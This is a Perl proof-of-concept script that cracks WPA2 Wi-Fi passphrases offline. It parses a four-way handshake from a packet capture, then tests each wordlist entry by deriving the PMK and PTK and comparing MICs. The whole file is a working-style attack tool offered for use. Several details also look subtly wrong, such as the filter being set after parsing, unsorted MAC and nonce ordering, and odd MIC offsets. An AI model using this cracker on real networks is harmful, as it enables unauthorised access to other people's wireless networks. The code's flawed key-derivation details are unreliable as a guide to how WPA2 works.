#!/usr/bin/perl
use strict;    # WPA2 CCMP Cracking (PoC) with Perl
use warnings;  # Douglas Berdeaux (2014)
use Net::Pcap;
use Crypt::PBKDF2; # PMK hashing
use Digest::SHA qw(hmac_sha1); # PTK/MIC hashing
use IO::File; # for speed (on avg proved faster than open();
$|=1; # disable print buffer
my $usage = "./wpa_crack.pl <BSSID> <WORDLIST> <PCAP FILE>";
my $bssid = shift or die $usage;
my $wordlist = shift or die $usage;
my $pcapFile = shift or die $usage;
(my $bssidDec = $bssid) =~ s/://g; # used for hashing
my ($nonce1,$nonce2,$essid,$pmk,$mic,$ptk,
 $err,$filter,$mac1,$mac2,$pke,$msg) = ("")x13; # declare variables before using them
my $pbkdf2 = Crypt::PBKDF2->new(
 hash_class => 'HMACSHA1', # HMAC-SHA1
 iterations => 4096, # key stretching
 salt_len => length($essid),
 output_len => 32
); # below string is required for hashing
foreach(split("","Pairwise key expansion\0\0")){
 $pke .= sprintf("%x",ord($_));
}
my $pcap = pcap_open_offline($pcapFile, \$err); # open file offline
pcap_loop($pcap, 0,\&eapol, '');
my $filterStr = 'wlan addr2 '.$bssid.' && ether proto 0x888e';
pcap_compile($pcap,\$filter,$filterStr,1,0) && die "cannot compile filter";
pcap_setfilter($pcap,$filter) && die "cannot set filter";
kill("ESSID") if $essid eq ""; # ALL of these values are required.
kill("MAC1") if $mac1 eq "";
kill("MAC2") if $mac2 eq "";
kill("NONCE1") if $nonce1 eq "";
kill("NONCE2") if $nonce2 eq "";
print "MAC1: ",$mac1,"\nMAC2: ",$mac2,"\nAnonce: ",$nonce1,
 "\nSnonce: ",$nonce2,"\nESSID: ",$essid,"\nMIC: ",$mic,"\n";
pcap_close($pcap) if $pcap; # finished file with, close up
my $words = IO::File->new($wordlist,'<') or die $wordlist.": ".$!;
while (my $psk = <$words>) {
 chomp $psk; # rid of new line
 $pmk = $pbkdf2->PBKDF2($essid, $psk); # generate PMK
 $ptk = ptk(); # generate PTK
 mic($psk); # Check with our MIC value
}
print "\n\npassphrase not in dictionary file, ",$wordlist,"\n";

sub kill{ # if absolutely anything is missing
 die "Could not determine ",$_[0];
}
sub eapol{ # parse eapol packets called by pcap_loop:
 my ($ud,$hdr,$pkt) = @_; # subtype of 8 is Beacon:
 if(hex(unpack("x26 h2",$pkt)) == 8 && unpack("H*",substr($pkt,36,6)) eq $bssidDec){
  # Tagged parameters start on byte 63 (null byte), 
  #   and the first is SSID in a Beacon,
  for(my $i=0;$i<(hex(unpack("x63 H2",$pkt)));$i++){
   my $tag = "x".(64 + $i)." C2"; # we add 1 for the tag length byte
   $essid .= sprintf("%c",(unpack($tag,$pkt)));
  }
  return;
 }elsif(unpack("x58 H4",$pkt) eq "888e"){ # EAPOL Packets
  if(!$mac1){ # get MAC addresses for station and AP:
   $mac1 = unpack("H*",substr($pkt,36,6))
    if($mac2 ne substr($pkt,36,6));
  }
  if(!$mac2){ # 6 byte values
   $mac2 = unpack("H*",substr($pkt,30,6)) 
    if($mac1 ne substr($pkt,30,6));
  }
  if(!$nonce1){ # 32 byte nonce values:
   $nonce1 = unpack("H*",substr($pkt,77,32)) 
    if($nonce2 ne unpack("H*",substr($pkt,77,32)));
  }
  if(!$nonce2){ # second nonce value must not be the first
   $nonce2 = unpack("H*",substr($pkt,77,32)) 
    if($nonce1 ne unpack("H*",substr($pkt,77,32)));
  }
  # Now we look for the message integrity check code:
  if(hex(unpack("x141 H2",$pkt))!=0){
   $mic = unpack("x141 H32",$pkt); # 16 bytes
   $msg = unpack("H*",substr($pkt,60,121)); # get message body
  }
 }
 return;
}
sub mic{ # the message integrity check.
 my $psk = shift;
 print " "x63,"\b"x63,"Trying: ",$psk,"\r";
 my $pad = "0"x32; # 16 null bytes for padding
 $msg =~ s/$mic/$pad/i; # remove the WPA2 MIC value string
 my $digest = hmac_sha1(pack("H*",$msg),pack("H*",substr(unpack("H*",$ptk),0,32)));
 if(substr(unpack("H*",$digest),1,16) eq substr($mic,1,16)){
  print "PTK: ",unpack("H*",$ptk),"\n";
  print "\n\n\tKEY FOUND: [ ",$psk," ] \n\n";
  exit; # we are done
        }
 return;
}
sub ptk{ # generate the PTK
 my $ptkGen =""; # temporary storage
 for(my$i=0;$i<4;$i++){ # four times for full string
  my $b = $mac1.$mac2.$nonce1.$nonce2."0".$i;
  my $concat = $pke.$b;
  $ptkGen .= hmac_sha1(pack("H*",$concat),$pmk);
 }
 return $ptkGen;
}
END{
 $words->close();
}
